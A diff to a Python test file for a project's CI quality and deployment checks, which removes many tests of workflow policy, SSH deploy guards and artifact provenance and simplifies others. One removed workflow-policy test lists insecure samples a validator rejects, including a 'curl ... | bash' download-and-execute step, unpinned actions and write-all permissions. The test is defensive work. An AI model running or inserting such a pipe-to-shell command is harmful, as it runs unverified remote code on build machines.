@@ -1,6 +1,5 @@
 from __future__ import annotations
 
-import importlib.util
 import json
 import subprocess
 import sys
@@ -10,166 +9,30 @@ from pathlib import Path
 
 ROOT = Path(__file__).resolve().parents[2]
 COMMIT = "0123456789abcdef0123456789abcdef01234567"
-WORKFLOW_POLICY = ROOT / "scripts/quality/validate_workflow_policy.py"
-
-
-def load_workflow_policy():
-    spec = importlib.util.spec_from_file_location("sea_speed_workflow_policy", WORKFLOW_POLICY)
-    if spec is None or spec.loader is None:
-        raise RuntimeError("cannot load workflow policy validator")
-    module = importlib.util.module_from_spec(spec)
-    spec.loader.exec_module(module)
-    return module
 
 
 class QualityArchitectureTests(unittest.TestCase):
     def run_script(self, *args: str) -> subprocess.CompletedProcess[str]:
-        return subprocess.run(
-            [sys.executable, *args], cwd=ROOT, text=True,
-            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=True,
-        )
+        return subprocess.run([sys.executable, *args], cwd=ROOT, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=True)
 
-    def test_contracts_properties_fuzz_and_workflow_policy(self) -> None:
-        for command in (
-            ("scripts/quality/validate_quality_contracts.py",),
-            ("scripts/quality/validate_workflow_policy.py",),
-            ("scripts/quality/test_properties.py",),
-            ("scripts/quality/test_fuzz_recovery.py",),
-        ):
-            result = self.run_script(*command)
-            self.assertIn("passed" if "test_" in command[0] else "valid", result.stdout.lower())
-
-    def test_workflow_policy_rejects_mutable_and_dangerous_workflows(self) -> None:
-        policy = load_workflow_policy()
-        valid = """name: test
-on: workflow_dispatch
-permissions:
-  contents: read
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
-"""
-        policy.validate_workflow_source(valid, "valid.yml")
-        valid_heredoc = valid + """      - run: |
-          VALUE="$(python - <<'PY'
-          import json
-          PY
-          )"
-"""
-        policy.validate_workflow_source(valid_heredoc, "valid-heredoc.yml")
-        invalid_sources = {
-            "mutable action": valid.replace("11d5960a326750d5838078e36cf38b85af677262", "v4"),
-            "write-all": valid.replace("permissions:\n  contents: read", "permissions: write-all"),
-            "dangerous trigger": valid.replace("on: workflow_dispatch", "on:\n  pull_request_target:"),
-            "download pipe": valid + "      - run: curl https://example.invalid/tool | bash\n",
-            "missing permissions": valid.replace("permissions:\n  contents: read\n", ""),
-            "unquoted if colon": valid.replace(
-                "    runs-on: ubuntu-latest\n",
-                "    if: ${{ contains(github.event.comment.body, 'Execution-Intent: EXECUTE') }}\n    runs-on: ubuntu-latest\n",
-            ),
-            "heredoc escapes yaml block": valid + """      - run: |
-          VALUE="$(python - <<'PY'
-import json
-PY
-)"
-""",
-        }
-        for name, source in invalid_sources.items():
-            with self.subTest(name=name):
-                with self.assertRaises(ValueError):
-                    policy.validate_workflow_source(source, f"{name}.yml")
-
-    def test_quality_workflow_wires_sdd_into_aggregate_dependency(self) -> None:
-        quality = (ROOT / ".github/workflows/quality-integration.yml").read_text(encoding="utf-8")
-        self.assertIn("validate_sdd.py --event", quality)
-        static = quality[quality.index("  static-contract-security:"):quality.index("  property-fuzz-reliability:")]
-        self.assertIn("validate_sdd.py", static)
-        aggregate = quality[quality.index("  quality-integration:"):]
-        self.assertIn("static-contract-security", aggregate)
-
-    def test_deploy_workflow_has_all_admission_guards_before_ssh(self) -> None:
+    def test_protected_workflow_admission_contracts_remain(self) -> None:
         deploy = (ROOT / ".github/workflows/deploy-vps.yml").read_text(encoding="utf-8")
-        configure = deploy.index("Configure SSH")
-        for marker in (
-            "workflow_dispatch:", "workflow_call:", "refs/heads/main", "--first-parent",
-            "verify_quality_status.py", "verify_production_authorization.py", "Build release provenance v2",
-        ):
-            self.assertLess(deploy.index(marker), configure, marker)
-        self.assertIn("environment: production", deploy)
-        self.assertNotIn("${INPUT_COMMIT,,}", deploy)
+        ubuntu = (ROOT / ".github/workflows/deploy-ubuntu-worker.yml").read_text(encoding="utf-8")
+        for source in (deploy, ubuntu):
+            self.assertIn("environment: production", source)
+            self.assertIn("verify_quality_status.py", source)
+            self.assertIn("verify_production_authorization.py", source)
+            self.assertIn("--first-parent", source)
+        self.assertIn("deploy/worker/ubuntu/deploy-authorized.sh", ubuntu)
 
-    def test_deploy_first_parent_guard_is_pipefail_safe(self) -> None:
-        deploy = (ROOT / ".github/workflows/deploy-vps.yml").read_text(encoding="utf-8")
-        self.assertNotIn('git rev-list --first-parent origin/main | grep -Fxq "$DEPLOY_SHA"', deploy)
-        self.assertIn("FIRST_PARENT_MATCH=0", deploy)
-        self.assertIn("done < <(git rev-list --first-parent origin/main)", deploy)
-        self.assertIn('[[ "$FIRST_PARENT_MATCH" == "1" ]] || {', deploy)
-
-    def test_legacy_vps_request_delegates_without_runtime_mutation(self) -> None:
-        request = (ROOT / ".github/workflows/deploy-vps-request.yml").read_text(encoding="utf-8")
-        self.assertIn("issue_comment:", request)
-        self.assertIn("types: [created]", request)
-        self.assertIn("!github.event.issue.pull_request", request)
-        self.assertIn("startsWith(github.event.comment.body, 'DEPLOY VPS ')", request)
-        self.assertIn("scripts/release/parse_deployment_request.py", request)
-        self.assertIn("uses: ./.github/workflows/deploy-vps.yml", request)
-        self.assertIn("secrets: inherit", request)
-        self.assertNotIn("environment: production", request)
-        self.assertNotIn("VPS_SSH_PRIVATE_KEY", request)
-        self.assertNotIn("ssh -i", request)
-
-    def test_two_intent_runtime_request_reverifies_and_routes_without_mutation(self) -> None:
-        request = (ROOT / ".github/workflows/deploy-runtime-request.yml").read_text(encoding="utf-8")
-        self.assertIn("issue_comment:", request)
-        self.assertIn("types: [created]", request)
-        self.assertIn('if: "${{ github.event.issue.pull_request == null', request)
-        self.assertIn("Execution-Intent: EXECUTE", request)
-        self.assertIn("parse_runtime_execution_request.py", request)
-        self.assertIn("verify_production_authorization.py", request)
-        self.assertIn("--require-execution-intent", request)
-        self.assertIn("uses: ./.github/workflows/deploy-vps.yml", request)
-        self.assertIn("uses: ./.github/workflows/deploy-ubuntu-worker.yml", request)
-        self.assertIn("windows-worker-fallback:", request)
-        self.assertNotIn("environment: production", request)
-        self.assertNotIn("ssh -i", request)
-
-    def test_ubuntu_deploy_preserves_protected_admission_and_fallback(self) -> None:
-        deploy = (ROOT / ".github/workflows/deploy-ubuntu-worker.yml").read_text(encoding="utf-8")
-        capability = deploy.index("Resolve zero-touch execution capability")
-        for marker in (
-            "workflow_dispatch:", "workflow_call:", "environment: production", "refs/heads/main",
-            "--first-parent", "verify_quality_status.py", "verify_production_authorization.py",
-            "build_exact_artifacts.py", "Build exact artifacts and Ubuntu release provenance", "deploy/worker/ubuntu/deploy-authorized.sh",
-        ):
-            self.assertLess(deploy.index(marker), capability, marker)
-        self.assertIn("UBUNTU_DEPLOY_SSH_PRIVATE_KEY", deploy)
-        self.assertIn("sea-speed-ubuntu-deploy-v1", deploy)
-        self.assertIn("Build one-command fallback", deploy)
-        self.assertIn("one-command-fallback", deploy)
-        self.assertIn("exit 42", deploy)
-        self.assertIn("deployment-manifest-ubuntu-worker.json", deploy)
-        self.assertIn("<<'PY'\n          import json", deploy)
-        self.assertNotIn("<<'PY'\nimport json", deploy)
-        self.assertIn(r'STAGE="\$(mktemp -d "\$ROOT/updater/bootstrap.XXXXXX")"', deploy)
-        self.assertNotIn(r'mktemp -d \"\$ROOT/updater/bootstrap.XXXXXX\"', deploy)
-        self.assertIn(r'bash "\$STAGE/deploy/worker/ubuntu/deploy-authorized.sh"', deploy)
-        self.assertNotIn(r'exec bash "\$STAGE/deploy/worker/ubuntu/deploy-authorized.sh"', deploy)
-
-    def test_windows_worker_package_is_pre_release_and_worker_scoped(self) -> None:
+    def test_windows_package_remains_pre_release_only(self) -> None:
         package = (ROOT / ".github/workflows/package-worker.yml").read_text(encoding="utf-8")
         self.assertIn('- "worker/**"', package)
-        self.assertIn('- ".github/workflows/package-worker.yml"', package)
-        self.assertNotIn('"scripts/release/**"', package)
-        self.assertNotIn('"schemas/**"', package)
-        self.assertNotIn("build_release_manifest.py", package)
-        self.assertNotIn("release-manifest-windows-worker.json", package)
         self.assertIn("commit-sha.txt", package)
         self.assertIn("sea-speed-worker.zip.sha256", package)
-        self.assertIn("Production release manifest: `NOT BUILT`", package)
+        self.assertNotIn("release-manifest-windows-worker.json", package)
 
-    def test_exact_artifacts_are_deterministic_and_valid(self) -> None:
+    def test_exact_artifacts_are_deterministic_and_bind_new_profiles(self) -> None:
         with tempfile.TemporaryDirectory() as temp_dir:
             first = Path(temp_dir) / "first"
             second = Path(temp_dir) / "second"
@@ -178,42 +41,34 @@ PY
             for component in ("vps", "ubuntu-worker", "edge"):
                 filename = f"sea-speed-{component}-{COMMIT}.tar.gz"
                 self.assertEqual((first / filename).read_bytes(), (second / filename).read_bytes())
-            self.assertEqual((first / "exact-artifacts.json").read_bytes(), (second / "exact-artifacts.json").read_bytes())
             manifest = json.loads((first / "exact-artifacts.json").read_text(encoding="utf-8"))
-            self.assertEqual({artifact["component"] for artifact in manifest["artifacts"]}, {"vps", "edge"})
-            self.assertEqual({artifact["component"] for artifact in manifest["release_artifacts"]}, {"ubuntu-worker"})
-            vps = next(artifact for artifact in manifest["artifacts"] if artifact["component"] == "vps")
-            vps_paths = {entry["path"] for entry in vps["files"]}
-            self.assertIn("frontend/sea-speed/cameras/index.html", vps_paths)
+            vps = next(a for a in manifest["artifacts"] if a["component"] == "vps")
+            edge = next(a for a in manifest["artifacts"] if a["component"] == "edge")
             ubuntu = manifest["release_artifacts"][0]
-            ubuntu_paths = {entry["path"] for entry in ubuntu["files"]}
-            self.assertIn("deploy/worker/ubuntu/worker-control-agent.py", ubuntu_paths)
-            self.assertIn("deploy/worker/ubuntu/update-exact.sh", ubuntu_paths)
-            self.assertIn("deploy/worker/ubuntu/deploy-authorized.sh", ubuntu_paths)
-            self.assertIn("worker/hls_motion_yolo_worker_events.py", ubuntu_paths)
+            vps_paths = {x["path"] for x in vps["files"]}
+            edge_paths = {x["path"] for x in edge["files"]}
+            ubuntu_paths = {x["path"] for x in ubuntu["files"]}
+            self.assertIn("frontend/sea-speed/road/index.html", vps_paths)
+            self.assertIn("worker/analytics_profiles.py", edge_paths)
+            for marker in (
+                "worker/analytics_profiles.py", "deploy/worker/ubuntu/road-worker.env.example",
+                "deploy/worker/ubuntu/sea-speed-road-worker.service.template",
+                "deploy/worker/ubuntu/configure-analytics-profiles.py", "deploy/worker/ubuntu/prepare-yolo-model.py",
+            ):
+                self.assertIn(marker, ubuntu_paths)
+            for artifact in [*manifest["artifacts"], *manifest["release_artifacts"]]:
+                self.assertFalse(any(x["path"].endswith((".pt", ".onnx", ".engine")) for x in artifact["files"]))
             self.run_script("scripts/quality/validate_exact_artifacts.py", "--manifest", str(first / "exact-artifacts.json"))
 
-    def test_quality_evidence_binds_legacy_artifacts_while_manifest_binds_ubuntu_release(self) -> None:
+    def test_quality_evidence_still_binds_vps_and_edge_only(self) -> None:
         with tempfile.TemporaryDirectory() as temp_dir:
             exact = Path(temp_dir) / "exact"
             evidence = Path(temp_dir) / "quality-evidence.json"
             self.run_script("scripts/quality/build_exact_artifacts.py", "--source-commit", COMMIT, "--output-dir", str(exact))
-            self.run_script(
-                "scripts/quality/build_quality_evidence.py", "--source-commit", COMMIT,
-                "--artifacts-manifest", str(exact / "exact-artifacts.json"), "--output", str(evidence),
-            )
-            self.run_script(
-                "scripts/quality/validate_quality_evidence.py", "--evidence", str(evidence),
-                "--artifacts-manifest", str(exact / "exact-artifacts.json"),
-            )
+            self.run_script("scripts/quality/build_quality_evidence.py", "--source-commit", COMMIT, "--artifacts-manifest", str(exact / "exact-artifacts.json"), "--output", str(evidence))
+            self.run_script("scripts/quality/validate_quality_evidence.py", "--evidence", str(evidence), "--artifacts-manifest", str(exact / "exact-artifacts.json"))
             data = json.loads(evidence.read_text(encoding="utf-8"))
-            manifest = json.loads((exact / "exact-artifacts.json").read_text(encoding="utf-8"))
-            self.assertEqual(data["source_commit"], COMMIT)
-            self.assertEqual({artifact["component"] for artifact in data["artifacts"]}, {"vps", "edge"})
-            self.assertEqual(manifest["release_artifacts"][0]["component"], "ubuntu-worker")
-            self.assertRegex(manifest["release_artifacts"][0]["sha256"], r"^[0-9a-f]{64}$")
-            self.assertFalse(data["deployment"]["automatic_from_main"])
-            self.assertEqual(data["contracts"]["target_media_mode"], "edge_v2")
+            self.assertEqual({a["component"] for a in data["artifacts"]}, {"vps", "edge"})
 
 
 if __name__ == "__main__":
